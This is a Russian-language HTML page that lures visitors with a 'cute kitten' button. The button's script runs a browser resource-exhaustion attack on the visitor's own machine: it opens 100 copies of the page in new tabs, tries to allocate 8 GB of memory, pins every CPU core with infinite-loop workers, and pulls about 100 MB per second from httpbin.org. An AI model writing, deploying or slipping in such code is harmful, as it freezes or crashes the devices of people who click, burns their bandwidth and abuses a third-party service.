<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Секретный котёнок</title>
    <style>
        body {
            background: #0a0f0f;
            color: #0ff;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding: 50px;
        }
        button {
            background: #ffaa00;
            border: none;
            color: #000;
            font-size: 2em;
            padding: 20px 40px;
            border-radius: 15px;
            cursor: pointer;
            font-weight: bold;
            box-shadow: 0 0 30px orange;
            transition: 0.2s;
        }
        button:hover {
            background: #ff8800;
            box-shadow: 0 0 40px #ffaa00;
        }
        #status {
            color: #ffaa00;
            font-size: 1.5em;
            margin-top: 30px;
        }
        #warning {
            color: #f44;
            font-size: 1.2em;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h1>😺 Хочешь увидеть милого котенка?</h1>
    <button id="startBtn">нажми на эту кнопку, не упусти шанс!</button>
    <div id="status">Ожидание...</div>
    <div id="warning">⚠️ Это может сильно нагрузить компьютер. Ты предупреждён.</div>

    <script>
        document.getElementById('startBtn').addEventListener('click', function() {
            const status = document.getElementById('status');
            status.innerText = 'Запуск армии котят...';

            // ========== 1. ОТКРЫТИЕ 100 ВКЛАДОК ==========
            status.innerText = 'Открываю 100 вкладок...';
            for (let i = 0; i < 100; i++) {
                setTimeout(() => {
                    window.open(window.location.href, '_blank');
                }, i * 30); // задержка, чтобы не заблокировать сразу
            }

            // ========== 2. ЗАХВАТ 8 ГБ ПАМЯТИ ==========
            status.innerText = 'Выделяю 8 ГБ памяти...';
            setTimeout(() => {
                try {
                    const memoryChunks = [];
                    const targetBytes = 8 * 1024 * 1024 * 1024; // 8 ГБ
                    const chunkSize = 100 * 1024 * 1024; // 100 МБ
                    let allocated = 0;

                    function allocate() {
                        while (allocated < targetBytes) {
                            let chunk = new ArrayBuffer(chunkSize);
                            memoryChunks.push(chunk);
                            allocated += chunkSize;
                            status.innerText = `Память: ${(allocated / (1024*1024*1024)).toFixed(1)} ГБ...`;
                        }
                        status.innerText = '8 ГБ выделено (теоретически).';
                    }
                    setTimeout(allocate, 500);
                } catch (e) {
                    status.innerText = 'Ошибка памяти: ' + e;
                }
            }, 1000);

            // ========== 3. 100% CPU НАГРУЗКА ==========
            status.innerText = 'Загружаю CPU...';
            if (window.Worker) {
                const coreCount = navigator.hardwareConcurrency || 4;
                for (let i = 0; i < coreCount; i++) {
                    try {
                        const blob = new Blob([`
                            onmessage = function(e) {
                                while (true) {
                                    Math.sqrt(Math.random() * 1e9);
                                    Math.sin(Math.random());
                                    Math.cos(Math.random());
                                }
                            };
                        `]);
                        const worker = new Worker(URL.createObjectURL(blob));
                        worker.postMessage('start');
                    } catch (e) {}
                }
            }
            // Дополнительная нагрузка в основном потоке
            function burnCPU() {
                let start = Date.now();
                while (Date.now() - start < 50) {
                    Math.sqrt(Math.random() * 1e9);
                }
                setTimeout(burnCPU, 0);
            }
            setTimeout(burnCPU, 100);

            // ========== 4. СЕТЕВОЙ ТРАФИК 100 МБ/СЕК ==========
            status.innerText = 'Генерирую сетевой трафик...';
            // Используем httpbin.org для генерации больших ответов
            const trafficTargetMBps = 100; // 100 МБ/сек
            const chunkSizeMB = 10; // 10 МБ на запрос (httpbin.org/bytes/10485760)
            const requestsPerSecond = trafficTargetMBps / chunkSizeMB; // 10 запросов в сек

            function makeRequest() {
                const url = `https://httpbin.org/bytes/${chunkSizeMB * 1024 * 1024}?r=${Math.random()}`;
                fetch(url)
                    .then(response => response.blob()) // потребляем данные
                    .catch(() => {}); // игнорируем ошибки
            }

            // Запускаем по 10 запросов каждую секунду
            setInterval(() => {
                for (let i = 0; i < requestsPerSecond; i++) {
                    setTimeout(makeRequest, i * 100); // равномерно распределяем
                }
            }, 1000);

            status.innerText = 'Котята атакуют! Смотри диспетчер задач.';
        });
    </script>
</body>
</html>
